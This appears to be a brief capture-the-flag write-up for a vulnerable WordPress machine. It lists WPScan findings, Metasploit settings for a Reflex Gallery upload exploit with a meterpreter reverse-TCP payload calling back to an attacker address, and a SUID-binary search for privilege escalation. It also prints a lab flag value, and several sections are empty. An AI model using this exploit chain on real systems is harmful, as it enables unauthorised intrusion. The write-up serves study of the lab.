#  box writeup



## Ports open
```

```

## Bruteforcing directories
```


```

## Reading notes.txt
```
You Need to ZIP Your Wayout
```



## WPSCAN - Possible Vulnerabilities
```
| [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
 | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
 | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
 | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
 | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
 | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
 | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
 | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
 | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
 | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
 | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Search Block
 | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
 | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
 | [!] Title: WordPress <= 5.2.3 - Hardening Bypass
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS in Block Editor
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS via Media Files
 | [!] Title: WordPress < 5.4.2 - Open Redirection
 | [!] Title: WordPress < 5.4.2 - Authenticated Stored XSS via Theme Upload
 | [!] Title: WordPress < 5.4.2 - Misuse of set-screen-option Leading to Privilege Escalation
 | [!] Title: WordPress < 5.4.2 - Disclosure of Password-Protected Page/Post Comments
 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
 | [!] Title: WordPress < 5.8 - Plugin Confusion
 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
 | [!] Title: Gwolle Guestbook <= 1.5.3 - Remote File Inclusion (RFI)
 | [!] Title: Gwolle Guestbook <= 2.1.0 - Cross-Site Request Forgery (CSRF)
 | [!] Title: Gwolle Guestbook <= 2.1.0 - Unauthenticated Stored Cross-Site Scripting (XSS) 
 | [!] Title: Gwolle Guestbook <= 2.5.3 - Cross-Site Scripting (XSS)
 | [!] Title: Gwolle Guestbook < 4.2.0 - Reflected Cross-Site Scripting
 | [!] Title: Mail Masta <= 1.0 - Unauthenticated Local File Inclusion (LFI)
 | [!] Title: Mail Masta 1.0 - Multiple SQL Injection
 | [!] Title: Reflex Gallery <= 3.1.3 - Arbitrary File Upload
 | [!] Title: Multiple Plugins - jQuery prettyPhoto DOM Cross-Site Scripting (XSS)
 | [!] Title: Site Editor <= 1.1.1 - Local File Inclusion (LFI)
 | [!] Title: Slideshow Gallery < 1.4.7 - Arbitrary File Upload
 | [!] Title: Tribulant Slideshow Gallery <= 1.5.3 - Arbitrary file upload & Cross-Site Scripting (XSS) 
 | [!] Title: Tribulant Slideshow Gallery <= 1.6.4 - Authenticated Cross-Site Scripting (XSS)
 | [!] Title: Slideshow Gallery <= 1.6.5 - Multiple Authenticated Cross-Site Scripting (XSS)
 | [!] Title: Slideshow Gallery <= 1.6.8 - XSS and SQLi
 | [!] Title: Slideshow Gallery < 1.7.4 - Admin+ Stored Cross-Site Scripting
 | [!] Title: EasyCart <= 3.0.15 - Unrestricted File Upload
 | [!] Title: EasyCart 1.1.30 - 3.0.20 - Privilege Escalation
 | [!] Title: Shopping Cart & eCommerce Store < 5.1.1 - CSRF to Stored Cross-Site Scripting
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 – Authenticated SQL Injection
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution (RCE)
 | [!] Title: WP Support Plus Responsive Ticket System < 9.0.3 - Multiple Authenticated SQL Injection
 | [!] Title: WP Support Plus Responsive Ticket System < 9.1.2 - Stored XSS
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.0 - Privilege Escalation
 | [!] Title: WP Support Plus Responsive Ticket System < 8.0.8 - Remote Code Execution
 | [!] Title: WP Symposium 13.04 - Unvalidated Redirect
 | [!] Title: WP Symposium <= 12.07.07 - Authentication Bypass
 | [!] Title: WP Symposium <= 14.11 - Unauthenticated Shell Upload
 | [!] Title: WP Symposium <= 15.1 - SQL Injection
 | [!] Title: WP Symposium <=  15.5.1 - Unauthenticated SQL Injection
 | [!] Title: WP Symposium <= 15.1 - Blind SQL Injection
 | [!] Title: WP Symposium <= 15.8.1 - Unauthenticated Reflected Cross-Site Scripting (XSS)


```




## Metasploit Exploit - exploit/unix/webapp/wp_reflexgallery_file_upload
```

Module options (exploit/unix/webapp/wp_reflexgallery_file_upload):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.232.23   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /wordpress       yes       The base path to the wordpress application
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.49.232   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Reflex Gallery 3.1.3

```

### Uploading a recon script
```


```

### Searching for files in the /var/www/html/ directory
```

```

### Searching for files in the home folder
```
/home
/home/raj
/home/raj/Documents
/home/raj/.config
/home/raj/Music
/home/raj/Templates
/home/raj/local.txt
/home/raj/examples.desktop
/home/raj/.cache
/home/raj/.ICEauthority
/home/raj/.bashrc
/home/raj/.sudo_as_admin_successful
/home/raj/Videos
/home/raj/flag1.txt
/home/raj/.profile
/home/raj/.gnupg
/home/raj/Downloads
/home/raj/Pictures
/home/raj/.bash_history
/home/raj/.gvfs
/home/raj/.bash_logout
/home/raj/.mysql_history
/home/raj/Public
/home/raj/plugin
/home/raj/plugin/78745b48b15bf2b81153556ef1c8ec48-mail-masta.zip
/home/raj/plugin/5be8270e880c445e11c59597497468bb-site-editor.zip
/home/raj/plugin/0e2dbc60f9c9522ebf2a62de1b1f7280-slideshow-gallery.1.4.6.zip
/home/raj/plugin/6f5605b37286f18941f975226c536195-dompdf-0.6.0.zip
/home/raj/plugin/2e1f384e5e49ab1d5fbf9eedf64c9a15-plainview-activity-monitor.20161228.zip
/home/raj/plugin/b5087bf1aa04bc58ce95080cccb879b2-gwolle-gb.1.5.3.zip
/home/raj/.dbus
/home/raj/.local
/home/raj/.mozilla
/home/raj/.ssh
/home/raj/Desktop

```
### Reading flag1.txt
```
Your flag is in another file...
```

### Reading local.txt
```
13b02e38a6572387e2c55b546d415006
```

### Finding suid binaries
find / -perm -u=s -type f 2>/dev/null
```
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/arping
/usr/bin/wget
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/bin/vmware-user-suid-wrapper
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping
/bin/cp
/bin/su

```

